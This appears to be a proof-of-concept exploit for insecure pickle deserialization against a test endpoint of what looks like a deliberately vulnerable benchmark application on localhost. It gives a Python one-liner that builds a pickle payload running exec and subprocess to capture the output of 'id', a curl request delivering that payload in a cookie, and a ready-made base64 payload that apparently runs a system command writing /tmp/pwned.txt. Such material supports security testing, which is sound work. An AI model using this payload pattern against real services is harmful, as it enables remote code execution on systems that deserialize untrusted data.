# Step 1: Generate malicious pickle payload (any Python environment)
python3 -c "
import pickle, base64
class RCE:
    def __reduce__(self):
        import subprocess
        code = '''
import helpers.utils
import subprocess
helpers.utils.sharedstr = subprocess.check_output(['id']).decode().strip()
'''
        return (exec, (code,))
payload = pickle.dumps(RCE())
print(base64.urlsafe_b64encode(payload).decode())
"

# Step 2: Send the POST request with the crafted cookie
curl -X POST 'http://localhost:8443/benchmark/deserialization-00/BenchmarkTest00078' \
  -b 'BenchmarkTest00078=PAYLOAD_FROM_STEP1'

# Alternative one-liner (direct RCE, writes to file):
curl -X POST 'http://localhost:8443/benchmark/deserialization-00/BenchmarkTest00078' \
  -b 'BenchmarkTest00078=gASVOAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjB0gPiAvdG1wL3B3bmVkLnR4dJSHaJRSlC4='